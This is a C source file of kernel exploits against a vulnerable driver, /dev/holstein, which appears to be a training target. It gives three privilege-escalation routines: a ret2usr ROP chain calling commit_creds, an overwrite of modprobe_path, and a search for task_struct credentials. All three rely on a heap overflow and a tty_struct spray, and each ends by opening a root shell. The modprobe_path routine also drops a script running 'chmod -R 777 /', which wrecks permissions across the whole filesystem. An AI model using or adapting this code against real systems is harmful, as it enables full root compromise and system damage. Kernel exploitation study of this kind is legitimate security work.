
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define ERROR(x) printf("Error: %s\n", x); return -1;
#define tty_ops_offset            0xc38880
#define pop_rdi_ret               0x0d748d + kbase
#define pop_rcx_ret               0x13c1c4 + kbase
#define mov_rax_ptr_rdx           0x3a5f29 + kbase
#define mov_ptr_rdx_rcx_ret       0x0477f7 + kbase
#define mov_rdi_rax_rep_movsq_ret 0x62707b + kbase // mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
#define push_r8_pop_rsp_pop2_ret  0x5f7e60 + kbase // 0xffffffff8114fbea: push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; 
#define commit_creds              0x0744b0 + kbase
#define prepare_kernel_creds      0x074650 + kbase
#define kpti_trampoline           0x800e26 + kbase
#define modprobe_path             0xe38180 + kbase

uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    ".att_syntax;"
    );
}

int exp_ret2usr(){
    save_user_state();
    /* fill kmalloc-1024 with tty_struct */ 
    uint8_t spray[256];
    int fd;
    for(int i = 0; i < 128; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    if((fd = open("/dev/holstein", O_RDWR)) < 0){ERROR("Failed to open the vulnerable device, error while opening /dev/holetien..")} 

    /* since we're not sure if our sprayed objects would be before or after our controlled chunk */
    for(int i = 128; i < 256; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    uint64_t payload[0x500], leak[0x500];
    if(read(fd, leak, 0x500) < 0){ERROR("Failed to read from the vulnerable driver..")}

    uint64_t kbase = leak[0x418/sizeof(uint64_t)] - tty_ops_offset; // tty_ops at offset 0x18, tty_ops is also the function table pointer we want to fake
    uint64_t g_buf = leak[0x438/sizeof(uint64_t)] - 0x438;          // kernel heap leak to find the g_buf address
    printf("kernel base address:  %p\nkernel g_buf address: %p\n", kbase, g_buf);

    /* create a fake function table inside our buffer */
    payload[12] = push_r8_pop_rsp_pop2_ret;
    
    /* now finally rop! */
    int i = 15;
    payload[i++] = pop_rdi_ret;
    payload[i++] = 0x0;
    payload[i++] = prepare_kernel_creds;
    payload[i++] = pop_rcx_ret;
    payload[i++] = 0x0;
    payload[i++] = mov_rdi_rax_rep_movsq_ret;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;
    

    /* overwrite the tty_ops table, make sure we don't overwrite important values and magic numbers */
    payload[0x400/sizeof(uint64_t)] = leak[0x400/sizeof(uint64_t)]; 
    payload[0x410/sizeof(uint64_t)] = leak[0x410/sizeof(uint64_t)];
    payload[0x418/sizeof(uint64_t)] = g_buf; 
    
    if(write(fd, payload, 0x420) < 0){ERROR("Failed to write to the vulnerable driver..")} // heap overflow
    /* trigger the fake function table by ioctl */
    for(int i = 0; i < 256; i++){
        ioctl(spray[i], 0xdeadbeef, g_buf+13*sizeof(uint64_t)); // we have control over rcx, rdx, rsi, r8, r12, r14
    }

    return 0;
}

int exp_modprobe_path(){ // we could also modify the core_pattern script and crash a user program to achive similar result
    /* fill kmalloc-1024 with tty_struct */ 
    uint8_t spray[256];
    int fd;
    for(int i = 0; i < 128; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    if((fd = open("/dev/holstein", O_RDWR)) < 0){ERROR("Failed to open the vulnerable device, error while opening /dev/holetien..")} 

    /* since we're not sure if our sprayed objects would be before or after our controlled chunk */
    for(int i = 128; i < 256; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    uint64_t payload[0x500], leak[0x500];
    if(read(fd, leak, 0x500) < 0){ERROR("Failed to read from the vulnerable driver..")}

    uint64_t kbase = leak[0x418/sizeof(uint64_t)] - tty_ops_offset; // tty_ops at offset 0x18, tty_ops is also the function table pointer we want to fake
    uint64_t g_buf = leak[0x438/sizeof(uint64_t)] - 0x438;          // kernel heap leak to find the g_buf address
    printf("kernel base address:  %p\nkernel g_buf address: %p\n", kbase, g_buf);

    /* create a fake function table inside our buffer */
    payload[12] = mov_ptr_rdx_rcx_ret;

    /* overwrite the tty_ops table, make sure we don't overwrite important values and magic numbers */
    payload[0x400/sizeof(uint64_t)] = leak[0x400/sizeof(uint64_t)]; 
    payload[0x410/sizeof(uint64_t)] = leak[0x410/sizeof(uint64_t)];
    payload[0x418/sizeof(uint64_t)] = g_buf; 
    
    if(write(fd, payload, 0x420) < 0){ERROR("Failed to write to the vulnerable driver..")} // heap overflow
    /* trigger the fake function table by ioctl */
    for(int i = 0; i < 256; i++){
        ioctl(spray[i], 0x706d742f, modprobe_path); // modprobe_path -> "/tmp"
    }
    for(int i = 0; i < 256; i++){
        ioctl(spray[i], 0x782f, modprobe_path+4);   // modprobe_path+4 -> "/x"
    }
    system("echo -ne '#!/bin/sh\nchmod -R 777 /' > /tmp/x; chmod +x /tmp/x"); // exploit
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake; chmod +x /tmp/fake; /tmp/fake"); // trigger 

    return 0;
}

int exp_task_struct(){

    /* fill kmalloc-1024 with tty_struct */ 
    uint8_t spray[50];
    int fd;
    for(int i = 0; i < 25; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    if((fd = open("/dev/holstein", O_RDWR)) < 0){ERROR("Failed to open the vulnerable device, error while opening /dev/holetien..")} 

    /* since we're not sure if our sprayed objects would be before or after our controlled chunk */
    for(int i = 25; i < 50; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    uint64_t payload[0x500], leak[0x500];
    if(read(fd, leak, 0x500) < 0){ERROR("Failed to read from the vulnerable driver..")}

    uint64_t kbase = leak[0x418/sizeof(uint64_t)] - tty_ops_offset; // tty_ops at offset 0x18, tty_ops is also the function table pointer we want to fake
    uint64_t g_buf = leak[0x438/sizeof(uint64_t)] - 0x438;          // kernel heap leak to find the g_buf address
    printf("kernel base address:  %p\nkernel g_buf address: %p\n", kbase, g_buf);

    
    /* create a fake function table inside our buffer */
    payload[12] = mov_rax_ptr_rdx;

    /* overwrite the tty_ops table, make sure we don't overwrite important values and magic numbers */
    payload[0x400/sizeof(uint64_t)] = leak[0x400/sizeof(uint64_t)]; 
    payload[0x410/sizeof(uint64_t)] = leak[0x410/sizeof(uint64_t)];
    payload[0x418/sizeof(uint64_t)] = g_buf; 

    if(write(fd, payload, 0x420) < 0){ERROR("Failed to write to the vulnerable driver..")} // heap overflow
    if(prctl(PR_SET_NAME, "UnknownD")){ERROR("Failed to set thread's name with prctl..")} // there is a string (char comm[ TASK_COMM_LEN]) that contains the thread's name, we can utilize it to find the task_struct
    /* trigger the fake function table by ioctl */
    int spray_index;
    uint64_t comm_address; 
    for(comm_address = g_buf - 0x650000; ; comm_address += 0x8){    // 0x1000000
        if((comm_address & 0xffff) == 0){printf("searching task_struct->cred at: %p\n", comm_address);}
        uint32_t res1, res2;
        for(int i = 0; i < 50; i++){
            res1 = ioctl(spray[i], 0, comm_address); 
            spray_index = i;
            if(res1 == 0x6e6b6e55){
                res2 = ioctl(spray[spray_index], 0, comm_address+4);
                if(res2 == 0x446e776f){break;}
            } 
        }
        if(res1 == 0x6e6b6e55 && res2 == 0x446e776f){break;}
    }
    /* TODO: fix the error */
    uint64_t current_cred = 0;
    current_cred = ioctl(spray[spray_index], 0, comm_address-8);     
    current_cred |= ioctl(spray[spray_index], 0, comm_address-4) << 32;
    
    printf("Found task_struct->comm at: %p\n", comm_address);
    printf("Found task_struct->cred at: %p\n", current_cred);
    for(int i = 0; i < 8; i++) { //overwrite every id entry of cred (id=0 root)
        payload[12] = mov_ptr_rdx_rcx_ret; 
        if(write(fd, payload, 0x420) < 0){ERROR("Failed to write to the vulnerable driver..")} // heap overflow
        ioctl(spray[spray_index], 0, current_cred+i);
    }
    system("/bin/sh");
    return 0;
}


int main(int argc, char **argv){
    //exp_ret2usr();
    //exp_modprobe_path();
    //exp_task_struct();
    return 0;
}